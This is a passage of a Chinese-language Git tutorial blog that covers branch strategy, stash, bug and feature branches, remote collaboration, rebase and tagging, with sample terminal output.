<p>合并后，我们用git log看看分支历史：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git log --graph --pretty=oneline --abbrev-commit</span><br><span class="line">*   e1e9c68 (HEAD -&gt; master) merge with no-ff</span><br><span class="line">|\  </span><br><span class="line">| * f52c633 (dev) add merge</span><br><span class="line">|/  </span><br><span class="line">*   cf810e4 conflict fixed</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>可以看到，不使用Fast forward模式，merge后就像这样：<br><img src="https://mfaying.github.io/static/images/hbase/11.jpg" alt></p>
<p>分支策略</p>
<p>在实际开发中，我们应该按照几个基本原则进行分支管理：</p>
<p>首先，master分支应该是非常稳定的，也就是仅用来发布新版本，平时不能在上面干活；</p>
<p>那在哪干活呢？干活都在dev分支上，也就是说，dev分支是不稳定的，到某个时候，比如1.0版本发布时，再把dev分支合并到master上，在master分支发布1.0版本；</p>
<p>你和你的小伙伴们每个人都在dev分支上干活，每个人都有自己的分支，时不时地往dev分支上合并就可以了。</p>
<p>所以，团队合作的分支看起来就像这样：<br><img src="https://mfaying.github.io/static/images/hbase/12.jpg" alt></p>
<h2 id="Bug分支"><a href="#Bug分支" class="headerlink" title="Bug分支"></a>Bug分支</h2><p>软件开发中，bug就像家常便饭一样。有了bug就需要修复，在Git中，由于分支是如此的强大，所以，每个bug都可以通过一个新的临时分支来修复，修复后，合并分支，然后将临时分支删除。</p>
<p>当你接到一个修复一个代号101的bug的任务时，很自然地，你想创建一个分支issue-101来修复它，但是，等等，当前正在dev上进行的工作还没有提交：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git status</span><br><span class="line">On branch dev</span><br><span class="line">Changes to be committed:</span><br><span class="line">  (use &quot;git reset HEAD &lt;file&gt;...&quot; to unstage)</span><br><span class="line"></span><br><span class="line">	new file:   hello.py</span><br><span class="line"></span><br><span class="line">Changes not staged for commit:</span><br><span class="line">  (use &quot;git add &lt;file&gt;...&quot; to update what will be committed)</span><br><span class="line">  (use &quot;git checkout -- &lt;file&gt;...&quot; to discard changes in working directory)</span><br><span class="line"></span><br><span class="line">	modified:   readme.txt</span><br></pre></td></tr></table></figure></p>
<p>并不是你不想提交，而是工作只进行到一半，还没法提交，预计完成还需1天时间。但是，必须在两个小时内修复该bug，怎么办？</p>
<p>幸好，Git还提供了一个stash功能，可以把当前工作现场“储藏”起来，等以后恢复现场后继续工作：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git stash</span><br><span class="line">Saved working directory and index state WIP on dev: f52c633 add merge</span><br></pre></td></tr></table></figure></p>
<p>现在，用git status查看工作区，就是干净的（除非有没有被Git管理的文件），因此可以放心地创建分支来修复bug。</p>
<p>首先确定要在哪个分支上修复bug，假定需要在master分支上修复，就从master创建临时分支：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git checkout master</span><br><span class="line">Switched to branch &apos;master&apos;</span><br><span class="line">Your branch is ahead of &apos;origin/master&apos; by 6 commits.</span><br><span class="line">  (use &quot;git push&quot; to publish your local commits)</span><br><span class="line"></span><br><span class="line">$ git checkout -b issue-101</span><br><span class="line">Switched to a new branch &apos;issue-101&apos;</span><br></pre></td></tr></table></figure></p>
<p>现在修复bug，需要把“Git is free software …”改为“Git is a free software …”，然后提交：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git add readme.txt </span><br><span class="line">$ git commit -m &quot;fix bug 101&quot;</span><br><span class="line">[issue-101 4c805e2] fix bug 101</span><br><span class="line"> 1 file changed, 1 insertion(+), 1 deletion(-)</span><br></pre></td></tr></table></figure></p>
<p>修复完成后，切换到master分支，并完成合并，最后删除issue-101分支：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git checkout master</span><br><span class="line">Switched to branch &apos;master&apos;</span><br><span class="line">Your branch is ahead of &apos;origin/master&apos; by 6 commits.</span><br><span class="line">  (use &quot;git push&quot; to publish your local commits)</span><br><span class="line"></span><br><span class="line">$ git merge --no-ff -m &quot;merged bug fix 101&quot; issue-101</span><br><span class="line">Merge made by the &apos;recursive&apos; strategy.</span><br><span class="line"> readme.txt | 2 +-</span><br><span class="line"> 1 file changed, 1 insertion(+), 1 deletion(-)</span><br></pre></td></tr></table></figure></p>
<p>太棒了，原计划两个小时的bug修复只花了5分钟！现在，是时候接着回到dev分支干活了！<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git checkout dev</span><br><span class="line">Switched to branch &apos;dev&apos;</span><br><span class="line"></span><br><span class="line">$ git status</span><br><span class="line">On branch dev</span><br><span class="line">nothing to commit, working tree clean</span><br></pre></td></tr></table></figure></p>
<p>工作区是干净的，刚才的工作现场存到哪去了？用git stash list命令看看：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git stash list</span><br><span class="line">stash@&#123;0&#125;: WIP on dev: f52c633 add merge</span><br></pre></td></tr></table></figure></p>
<p>工作现场还在，Git把stash内容存在某个地方了，但是需要恢复一下，有两个办法：</p>
<p>一是用git stash apply恢复，但是恢复后，stash内容并不删除，你需要用git stash drop来删除；</p>
<p>另一种方式是用git stash pop，恢复的同时把stash内容也删了：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git stash pop</span><br><span class="line">On branch dev</span><br><span class="line">Changes to be committed:</span><br><span class="line">  (use &quot;git reset HEAD &lt;file&gt;...&quot; to unstage)</span><br><span class="line"></span><br><span class="line">	new file:   hello.py</span><br><span class="line"></span><br><span class="line">Changes not staged for commit:</span><br><span class="line">  (use &quot;git add &lt;file&gt;...&quot; to update what will be committed)</span><br><span class="line">  (use &quot;git checkout -- &lt;file&gt;...&quot; to discard changes in working directory)</span><br><span class="line"></span><br><span class="line">	modified:   readme.txt</span><br><span class="line"></span><br><span class="line">Dropped refs/stash@&#123;0&#125; (5d677e2ee266f39ea296182fb2354265b91b3b2a)</span><br></pre></td></tr></table></figure></p>
<p>再用git stash list查看，就看不到任何stash内容了：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git stash list</span><br></pre></td></tr></table></figure></p>
<p>你可以多次stash，恢复的时候，先用git stash list查看，然后恢复指定的stash，用命令：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git stash apply stash@&#123;0&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="Feature分支"><a href="#Feature分支" class="headerlink" title="Feature分支"></a>Feature分支</h2><p>添加一个新功能时，你肯定不希望因为一些实验性质的代码，把主分支搞乱了，所以，每添加一个新功能，最好新建一个feature分支，在上面开发，完成后，合并，最后，删除该feature分支。</p>
<p>现在，你终于接到了一个新任务：开发代号为Vulcan的新功能<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git checkout -b feature-vulcan</span><br><span class="line">Switched to a new branch &apos;feature-vulcan&apos;</span><br></pre></td></tr></table></figure></p>
<p>开发完毕：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git add vulcan.py</span><br><span class="line"></span><br><span class="line">$ git status</span><br><span class="line">On branch feature-vulcan</span><br><span class="line">Changes to be committed:</span><br><span class="line">  (use &quot;git reset HEAD &lt;file&gt;...&quot; to unstage)</span><br><span class="line"></span><br><span class="line">	new file:   vulcan.py</span><br><span class="line"></span><br><span class="line">$ git commit -m &quot;add feature vulcan&quot;</span><br><span class="line">[feature-vulcan 287773e] add feature vulcan</span><br><span class="line"> 1 file changed, 2 insertions(+)</span><br><span class="line"> create mode 100644 vulcan.py</span><br></pre></td></tr></table></figure></p>
<p>切回dev，准备合并：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git checkout dev</span><br></pre></td></tr></table></figure></p>
<p>一切顺利的话，feature分支和bug分支是类似的，合并，然后删除。</p>
<p>但是！</p>
<p>就在此时，接到上级命令，因经费不足，新功能必须取消！<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git branch -d feature-vulcan</span><br><span class="line">error: The branch &apos;feature-vulcan&apos; is not fully merged.</span><br><span class="line">If you are sure you want to delete it, run &apos;git branch -D feature-vulcan&apos;.</span><br></pre></td></tr></table></figure></p>
<p>销毁失败。Git友情提醒，feature-vulcan分支还没有被合并，如果删除，将丢失掉修改，如果要强行删除，需要使用大写的-D参数。。</p>
<p>现在我们强行删除：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git branch -D feature-vulcan</span><br><span class="line">Deleted branch feature-vulcan (was 287773e).</span><br></pre></td></tr></table></figure></p>
<p>删除成功！</p>
<h2 id="多人协作"><a href="#多人协作" class="headerlink" title="多人协作"></a>多人协作</h2><p>当你从远程仓库克隆时，实际上Git自动把本地的master分支和远程的master分支对应起来了，并且，远程仓库的默认名称是origin。</p>
<p>要查看远程库的信息，用git remote：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git remote</span><br><span class="line">origin</span><br></pre></td></tr></table></figure></p>
<p>或者，用git remote -v显示更详细的信息：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git remote -v</span><br><span class="line">origin  git@github.com:michaelliao/learngit.git (fetch)</span><br><span class="line">origin  git@github.com:michaelliao/learngit.git (push)</span><br></pre></td></tr></table></figure></p>
<p>上面显示了可以抓取和推送的origin的地址。如果没有推送权限，就看不到push的地址。</p>
<p>推送分支</p>
<p>推送分支，就是把该分支上的所有本地提交推送到远程库。推送时，要指定本地分支，这样，Git就会把该分支推送到远程库对应的远程分支上：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git push origin master</span><br></pre></td></tr></table></figure></p>
<p>如果要推送其他分支，比如dev，就改成：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git push origin dev</span><br></pre></td></tr></table></figure></p>
<p>但是，并不是一定要把本地分支往远程推送，那么，哪些分支需要推送，哪些不需要呢？</p>
<ol>
<li><p>master分支是主分支，因此要时刻与远程同步；</p>
</li>
<li><p>dev分支是开发分支，团队所有成员都需要在上面工作，所以也需要与远程同步；</p>
</li>
<li><p>bug分支只用于在本地修复bug，就没必要推到远程了，除非老板要看看你每周到底修复了几个bug；</p>
</li>
<li><p>feature分支是否推到远程，取决于你是否和你的小伙伴合作在上面开发。</p>
</li>
</ol>
<p>抓取分支</p>
<p>多人协作时，大家都会往master和dev分支上推送各自的修改。</p>
<p>现在，模拟一个你的小伙伴，可以在另一台电脑（注意要把SSH Key添加到GitHub）或者同一台电脑的另一个目录下克隆：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git clone git@github.com:michaelliao/learngit.git</span><br><span class="line">Cloning into &apos;learngit&apos;...</span><br><span class="line">remote: Counting objects: 40, done.</span><br><span class="line">remote: Compressing objects: 100% (21/21), done.</span><br><span class="line">remote: Total 40 (delta 14), reused 40 (delta 14), pack-reused 0</span><br><span class="line">Receiving objects: 100% (40/40), done.</span><br><span class="line">Resolving deltas: 100% (14/14), done.</span><br></pre></td></tr></table></figure></p>
<p>当你的小伙伴从远程库clone时，默认情况下，你的小伙伴只能看到本地的master分支。不信可以用git branch命令看看：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git branch</span><br><span class="line">* master</span><br></pre></td></tr></table></figure></p>
<p>现在，你的小伙伴要在dev分支上开发，就必须创建远程origin的dev分支到本地，于是他用这个命令创建本地dev分支：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git checkout -b dev origin/dev</span><br></pre></td></tr></table></figure></p>
<p>现在，他就可以在dev上继续修改，然后，时不时地把dev分支push到远程：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git add env.txt</span><br><span class="line"></span><br><span class="line">$ git commit -m &quot;add env&quot;</span><br><span class="line">[dev 7a5e5dd] add env</span><br><span class="line"> 1 file changed, 1 insertion(+)</span><br><span class="line"> create mode 100644 env.txt</span><br><span class="line"></span><br><span class="line">$ git push origin dev</span><br><span class="line">Counting objects: 3, done.</span><br><span class="line">Delta compression using up to 4 threads.</span><br><span class="line">Compressing objects: 100% (2/2), done.</span><br><span class="line">Writing objects: 100% (3/3), 308 bytes | 308.00 KiB/s, done.</span><br><span class="line">Total 3 (delta 0), reused 0 (delta 0)</span><br><span class="line">To github.com:michaelliao/learngit.git</span><br><span class="line">   f52c633..7a5e5dd  dev -&gt; dev</span><br></pre></td></tr></table></figure></p>
<p>你的小伙伴已经向origin/dev分支推送了他的提交，而碰巧你也对同样的文件作了修改，并试图推送：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat env.txt</span><br><span class="line">env</span><br><span class="line"></span><br><span class="line">$ git add env.txt</span><br><span class="line"></span><br><span class="line">$ git commit -m &quot;add new env&quot;</span><br><span class="line">[dev 7bd91f1] add new env</span><br><span class="line"> 1 file changed, 1 insertion(+)</span><br><span class="line"> create mode 100644 env.txt</span><br><span class="line"></span><br><span class="line">$ git push origin dev</span><br><span class="line">To github.com:michaelliao/learngit.git</span><br><span class="line"> ! [rejected]        dev -&gt; dev (non-fast-forward)</span><br><span class="line">error: failed to push some refs to &apos;git@github.com:michaelliao/learngit.git&apos;</span><br><span class="line">hint: Updates were rejected because the tip of your current branch is behind</span><br><span class="line">hint: its remote counterpart. Integrate the remote changes (e.g.</span><br><span class="line">hint: &apos;git pull ...&apos;) before pushing again.</span><br><span class="line">hint: See the &apos;Note about fast-forwards&apos; in &apos;git push --help&apos; for details.</span><br></pre></td></tr></table></figure></p>
<p>推送失败，因为你的小伙伴的最新提交和你试图推送的提交有冲突，解决办法也很简单，Git已经提示我们，先用git pull把最新的提交从origin/dev抓下来，然后，在本地合并，解决冲突，再推送：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git pull</span><br><span class="line">There is no tracking information for the current branch.</span><br><span class="line">Please specify which branch you want to merge with.</span><br><span class="line">See git-pull(1) for details.</span><br><span class="line"></span><br><span class="line">    git pull &lt;remote&gt; &lt;branch&gt;</span><br><span class="line"></span><br><span class="line">If you wish to set tracking information for this branch you can do so with:</span><br><span class="line"></span><br><span class="line">    git branch --set-upstream-to=origin/&lt;branch&gt; dev</span><br></pre></td></tr></table></figure></p>
<p>git pull也失败了，原因是没有指定本地dev分支与远程origin/dev分支的链接，根据提示，设置dev和origin/dev的链接：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git branch --set-upstream-to=origin/dev dev</span><br><span class="line">Branch &apos;dev&apos; set up to track remote branch &apos;dev&apos; from &apos;origin&apos;.</span><br></pre></td></tr></table></figure></p>
<p>再pull：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git pull</span><br><span class="line">Auto-merging env.txt</span><br><span class="line">CONFLICT (add/add): Merge conflict in env.txt</span><br><span class="line">Automatic merge failed; fix conflicts and then commit the result.</span><br></pre></td></tr></table></figure></p>
<p>这回git pull成功，但是合并有冲突，需要手动解决，解决的方法和分支管理中的解决冲突完全一样。解决后，提交，再push：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git commit -m &quot;fix env conflict&quot;</span><br><span class="line">[dev 57c53ab] fix env conflict</span><br><span class="line"></span><br><span class="line">$ git push origin dev</span><br><span class="line">Counting objects: 6, done.</span><br><span class="line">Delta compression using up to 4 threads.</span><br><span class="line">Compressing objects: 100% (4/4), done.</span><br><span class="line">Writing objects: 100% (6/6), 621 bytes | 621.00 KiB/s, done.</span><br><span class="line">Total 6 (delta 0), reused 0 (delta 0)</span><br><span class="line">To github.com:michaelliao/learngit.git</span><br><span class="line">   7a5e5dd..57c53ab  dev -&gt; dev</span><br></pre></td></tr></table></figure></p>
<p>因此，多人协作的工作模式通常是这样：</p>
<ol>
<li>首先，可以试图用git push origin <branch-name>推送自己的修改；</branch-name></li>
<li>如果推送失败，则因为远程分支比你的本地更新，需要先用git pull试图合并；</li>
<li>如果合并有冲突，则解决冲突，并在本地提交；</li>
<li>没有冲突或者解决掉冲突后，再用git push origin <branch-name>推送就能成功！<br>如果git pull提示no tracking information，则说明本地分支和远程分支的链接关系没有创建，用命令git branch –set-upstream-to <branch-name> origin/<branch-name>。</branch-name></branch-name></branch-name></li>
</ol>
<p>这就是多人协作的工作模式，一旦熟悉了，就非常简单。</p>
<h1 id="Rebase"><a href="#Rebase" class="headerlink" title="Rebase"></a>Rebase</h1><p>在上一节我们看到了，多人在同一个分支上协作时，很容易出现冲突。即使没有冲突，后push的童鞋不得不先pull，在本地合并，然后才能push成功。</p>
<p>每次合并再push后，分支变成了这样：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git log --graph --pretty=oneline --abbrev-commit</span><br><span class="line">* d1be385 (HEAD -&gt; master, origin/master) init hello</span><br><span class="line">*   e5e69f1 Merge branch &apos;dev&apos;</span><br><span class="line">|\  </span><br><span class="line">| *   57c53ab (origin/dev, dev) fix env conflict</span><br><span class="line">| |\  </span><br><span class="line">| | * 7a5e5dd add env</span><br><span class="line">| * | 7bd91f1 add new env</span><br><span class="line">| |/  </span><br><span class="line">* |   12a631b merged bug fix 101</span><br><span class="line">|\ \  </span><br><span class="line">| * | 4c805e2 fix bug 101</span><br><span class="line">|/ /  </span><br><span class="line">* |   e1e9c68 merge with no-ff</span><br><span class="line">|\ \  </span><br><span class="line">| |/  </span><br><span class="line">| * f52c633 add merge</span><br><span class="line">|/  </span><br><span class="line">*   cf810e4 conflict fixed</span><br></pre></td></tr></table></figure></p>
<p>总之看上去很乱，有强迫症的童鞋会问：为什么Git的提交历史不能是一条干净的直线？</p>
<p>其实是可以做到的！</p>
<p>Git有一种称为rebase的操作，有人把它翻译成“变基”。</p>
<p>在和远程分支同步后，我们对hello.py这个文件做了两次提交。用git log命令看看：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git log --graph --pretty=oneline --abbrev-commit</span><br><span class="line">* 582d922 (HEAD -&gt; master) add author</span><br><span class="line">* 8875536 add comment</span><br><span class="line">* d1be385 (origin/master) init hello</span><br><span class="line">*   e5e69f1 Merge branch &apos;dev&apos;</span><br><span class="line">|\  </span><br><span class="line">| *   57c53ab (origin/dev, dev) fix env conflict</span><br><span class="line">| |\  </span><br><span class="line">| | * 7a5e5dd add env</span><br><span class="line">| * | 7bd91f1 add new env</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>注意到Git用(HEAD -&gt; master)和(origin/master)标识出当前分支的HEAD和远程origin的位置分别是582d922 add author和d1be385 init hello，本地分支比远程分支快两个提交。<br>现在我们尝试推送本地分支：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git push origin master</span><br><span class="line">To github.com:michaelliao/learngit.git</span><br><span class="line"> ! [rejected]        master -&gt; master (fetch first)</span><br><span class="line">error: failed to push some refs to &apos;git@github.com:michaelliao/learngit.git&apos;</span><br><span class="line">hint: Updates were rejected because the remote contains work that you do</span><br><span class="line">hint: not have locally. This is usually caused by another repository pushing</span><br><span class="line">hint: to the same ref. You may want to first integrate the remote changes</span><br><span class="line">hint: (e.g., &apos;git pull ...&apos;) before pushing again.</span><br><span class="line">hint: See the &apos;Note about fast-forwards&apos; in &apos;git push --help&apos; for details.</span><br></pre></td></tr></table></figure></p>
<p>很不幸，失败了，这说明有人先于我们推送了远程分支。按照经验，先pull一下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git pull</span><br><span class="line">remote: Counting objects: 3, done.</span><br><span class="line">remote: Compressing objects: 100% (1/1), done.</span><br><span class="line">remote: Total 3 (delta 1), reused 3 (delta 1), pack-reused 0</span><br><span class="line">Unpacking objects: 100% (3/3), done.</span><br><span class="line">From github.com:michaelliao/learngit</span><br><span class="line">   d1be385..f005ed4  master     -&gt; origin/master</span><br><span class="line"> * [new tag]         v1.0       -&gt; v1.0</span><br><span class="line">Auto-merging hello.py</span><br><span class="line">Merge made by the &apos;recursive&apos; strategy.</span><br><span class="line"> hello.py | 1 +</span><br><span class="line"> 1 file changed, 1 insertion(+)</span><br></pre></td></tr></table></figure></p>
<p>再用git status看看状态：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">Your branch is ahead of &apos;origin/master&apos; by 3 commits.</span><br><span class="line">  (use &quot;git push&quot; to publish your local commits)</span><br><span class="line"></span><br><span class="line">nothing to commit, working tree clean</span><br></pre></td></tr></table></figure></p>
<p>加上刚才合并的提交，现在我们本地分支比远程分支超前3个提交。<br>用git log看看：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git log --graph --pretty=oneline --abbrev-commit</span><br><span class="line">*   e0ea545 (HEAD -&gt; master) Merge branch &apos;master&apos; of github.com:michaelliao/learngit</span><br><span class="line">|\  </span><br><span class="line">| * f005ed4 (origin/master) set exit=1</span><br><span class="line">* | 582d922 add author</span><br><span class="line">* | 8875536 add comment</span><br><span class="line">|/  </span><br><span class="line">* d1be385 init hello</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>对强迫症童鞋来说，如果现在把本地分支push到远程，提交历史分叉了。</p>
<p>这个时候，rebase就派上了用场。我们输入命令git rebase试试：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git rebase</span><br><span class="line">First, rewinding head to replay your work on top of it...</span><br><span class="line">Applying: add comment</span><br><span class="line">Using index info to reconstruct a base tree...</span><br><span class="line">M	hello.py</span><br><span class="line">Falling back to patching base and 3-way merge...</span><br><span class="line">Auto-merging hello.py</span><br><span class="line">Applying: add author</span><br><span class="line">Using index info to reconstruct a base tree...</span><br><span class="line">M	hello.py</span><br><span class="line">Falling back to patching base and 3-way merge...</span><br><span class="line">Auto-merging hello.py</span><br></pre></td></tr></table></figure></p>
<p>输出了一大堆操作，到底是啥效果？再用git log看看：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git log --graph --pretty=oneline --abbrev-commit</span><br><span class="line">* 7e61ed4 (HEAD -&gt; master) add author</span><br><span class="line">* 3611cfe add comment</span><br><span class="line">* f005ed4 (origin/master) set exit=1</span><br><span class="line">* d1be385 init hello</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>原本分叉的提交现在变成一条直线了！这种神奇的操作是怎么实现的？其实原理非常简单。我们注意观察，发现Git把我们本地的提交“挪动”了位置，放到了f005ed4 (origin/master) set exit=1之后，这样，整个提交历史就成了一条直线。rebase操作前后，最终的提交内容是一致的，但是，我们本地的commit修改内容已经变化了，它们的修改不再基于d1be385 init hello，而是基于f005ed4 (origin/master) set exit=1，但最后的提交7e61ed4内容是一致的。</p>
<p>这就是rebase操作的特点：把分叉的提交历史“整理”成一条直线，看上去更直观。缺点是本地的分叉提交已经被修改过了。</p>
<p>最后，通过push操作把本地分支推送到远程：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mac:~/learngit michael$ git push origin master</span><br><span class="line">Counting objects: 6, done.</span><br><span class="line">Delta compression using up to 4 threads.</span><br><span class="line">Compressing objects: 100% (5/5), done.</span><br><span class="line">Writing objects: 100% (6/6), 576 bytes | 576.00 KiB/s, done.</span><br><span class="line">Total 6 (delta 2), reused 0 (delta 0)</span><br><span class="line">remote: Resolving deltas: 100% (2/2), completed with 1 local object.</span><br><span class="line">To github.com:michaelliao/learngit.git</span><br><span class="line">   f005ed4..7e61ed4  master -&gt; master</span><br></pre></td></tr></table></figure></p>
<p>再用git log看看效果：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git log --graph --pretty=oneline --abbrev-commit</span><br><span class="line">* 7e61ed4 (HEAD -&gt; master, origin/master) add author</span><br><span class="line">* 3611cfe add comment</span><br><span class="line">* f005ed4 set exit=1</span><br><span class="line">* d1be385 init hello</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>远程分支的提交历史也是一条直线。</p>
<h1 id="标签管理"><a href="#标签管理" class="headerlink" title="标签管理"></a>标签管理</h1><p>发布一个版本时，我们通常先在版本库中打一个标签（tag），这样，就唯一确定了打标签时刻的版本。将来无论什么时候，取某个标签的版本，就是把那个打标签的时刻的历史版本取出来。所以，标签也是版本库的一个快照。</p>
<p>Git的标签虽然是版本库的快照，但其实它就是指向某个commit的指针（跟分支很像对不对？但是分支可以移动，标签不能移动），所以，创建和删除标签都是瞬间完成的。</p>
<p>Git有commit，为什么还要引入tag？</p>
<p>“请把上周一的那个版本打包发布，commit号是6a5819e…”</p>
<p>“一串乱七八糟的数字不好找！”</p>
<p>如果换一个办法：</p>
<p>“请把上周一的那个版本打包发布，版本号是v1.2”</p>
<p>“好的，按照tag v1.2查找commit就行！”</p>
<p>所以，tag就是一个让人容易记住的有意义的名字，它跟某个commit绑在一起。</p>
<h2 id="创建标签"><a href="#创建标签" class="headerlink" title="创建标签"></a>创建标签</h2><p>在Git中打标签非常简单，首先，切换到需要打标签的分支上：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git branch</span><br><span class="line">* dev</span><br><span class="line">  master</span><br><span class="line">$ git checkout master</span><br><span class="line">Switched to branch &apos;master&apos;</span><br></pre></td></tr></table></figure></p>
<p>然后，敲命令git tag <code>&lt;name&gt;</code>就可以打一个新标签：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git tag v1.0</span><br></pre></td></tr></table></figure></p>
<p>可以用命令git tag查看所有标签：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git tag</span><br><span class="line">v1.0</span><br></pre></td></tr></table></figure></p>
<p>默认标签是打在最新提交的commit上的。有时候，如果忘了打标签，比如，现在已经是周五了，但应该在周一打的标签没有打，怎么办？</p>
<p>方法是找到历史提交的commit id，然后打上就可以了：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git log --pretty=oneline --abbrev-commit</span><br><span class="line">12a631b (HEAD -&gt; master, tag: v1.0, origin/master) merged bug fix 101</span><br><span class="line">4c805e2 fix bug 101</span><br><span class="line">e1e9c68 merge with no-ff</span><br><span class="line">f52c633 add merge</span><br><span class="line">cf810e4 conflict fixed</span><br><span class="line">5dc6824 &amp; simple</span><br><span class="line">14096d0 AND simple</span><br><span class="line">b17d20e branch test</span><br><span class="line">d46f35e remove test.txt</span><br><span class="line">b84166e add test.txt</span><br><span class="line">519219b git tracks changes</span><br><span class="line">e43a48b understand how stage works</span><br><span class="line">1094adb append GPL</span><br><span class="line">e475afc add distributed</span><br><span class="line">eaadf4e wrote a readme file</span><br></pre></td></tr></table></figure></p>
<p>比方说要对add merge这次提交打标签，它对应的commit id是f52c633，敲入命令：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git tag v0.9 f52c633</span><br></pre></td></tr></table></figure></p>
<p>再用命令git tag查看标签：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git tag</span><br><span class="line">v0.9</span><br><span class="line">v1.0</span><br></pre></td></tr></table></figure></p>
<p>注意，标签不是按时间顺序列出，而是按字母排序的。可以用git show <tagname>查看标签信息：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git show v0.9</span><br><span class="line">commit f52c63349bc3c1593499807e5c8e972b82c8f286 (tag: v0.9)</span><br><span class="line">Author: Michael Liao &lt;askxuefeng@gmail.com&gt;</span><br><span class="line">Date:   Fri May 18 21:56:54 2018 +0800</span><br><span class="line"></span><br><span class="line">    add merge</span><br><span class="line"></span><br><span class="line">diff --git a/readme.txt b/readme.txt</span><br><span class="line">...</span><br></pre></td></tr></table></figure></tagname></p>
<p>可以看到，v0.9确实打在add merge这次提交上。</p>
<p>还可以创建带有说明的标签，用-a指定标签名，-m指定说明文字：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git tag -a v0.1 -m &quot;version 0.1 released&quot; 1094adb</span><br></pre></td></tr></table></figure></p>
<p>用命令git show <code>&lt;tagname&gt;</code>可以看到说明文字：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git show v0.1</span><br><span class="line">tag v0.1</span><br><span class="line">Tagger: Michael Liao &lt;askxuefeng@gmail.com&gt;</span><br><span class="line">Date:   Fri May 18 22:48:43 2018 +0800</span><br><span class="line"></span><br><span class="line">version 0.1 released</span><br><span class="line"></span><br><span class="line">commit 1094adb7b9b3807259d8cb349e7df1d4d6477073 (tag: v0.1)</span><br><span class="line">Author: Michael Liao &lt;askxuefeng@gmail.com&gt;</span><br><span class="line">Date:   Fri May 18 21:06:15 2018 +0800</span><br><span class="line"></span><br><span class="line">    append GPL</span><br><span class="line"></span><br><span class="line">diff --git a/readme.txt b/readme.txt</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>注意：标签总是和某个commit挂钩。如果这个commit既出现在master分支，又出现在dev分支，那么在这两个分支上都可以看到这个标签。</p>
<h2 id="操作标签"><a href="#操作标签" class="headerlink" title="操作标签"></a>操作标签</h2><p>如果标签打错了，也可以删除：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git tag -d v0.1</span><br><span class="line">Deleted tag &apos;v0.1&apos; (was f15b0dd)</span><br></pre></td></tr></table></figure></p>
<p>因为创建的标签都只存储在本地，不会自动推送到远程。所以，打错的标签可以在本地安全删除。</p>
<p>如果要推送某个标签到远程，使用命令git push origin <code>&lt;tagname&gt;</code>：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git push origin v1.0</span><br><span class="line">Total 0 (delta 0), reused 0 (delta 0)</span><br><span class="line">To github.com:michaelliao/learngit.git</span><br><span class="line"> * [new tag]         v1.0 -&gt; v1.0</span><br></pre></td></tr></table></figure></p>
